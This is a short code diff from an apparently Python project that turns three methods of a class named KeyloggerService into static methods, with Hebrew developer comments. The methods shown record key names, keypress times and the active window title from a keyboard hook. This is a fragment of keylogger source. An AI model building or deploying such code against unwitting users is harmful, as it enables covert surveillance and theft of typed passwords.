@@ -24,8 +24,8 @@ class KeyloggerService:
         #
         keyboard.on_release(self.handle_input)
 
-
-    def get_keyword(self,key: keyboard.KeyboardEvent):
+    @staticmethod
+    def get_keyword(key: keyboard.KeyboardEvent):
         key_name = key.name
         # להבדיל בין תווים למקשים מיוחדים
         # למצוא דרך לזהות לחיצה על כמה מקשים בו זמנית
@@ -36,12 +36,14 @@ class KeyloggerService:
 
         return key_name
 
-    def get_time(self,key: keyboard.KeyboardEvent):
+    @staticmethod
+    def get_time(key: keyboard.KeyboardEvent):
         key_time = key.time
         key_time = datetime.fromtimestamp(key_time).strftime('%Y-%m-%d %H:%M')
         return key_time
 
-    def get_active_window(self):
+    @staticmethod
+    def get_active_window():
         return pw.getActiveWindowTitle()
 
     def handle_input(self,key):
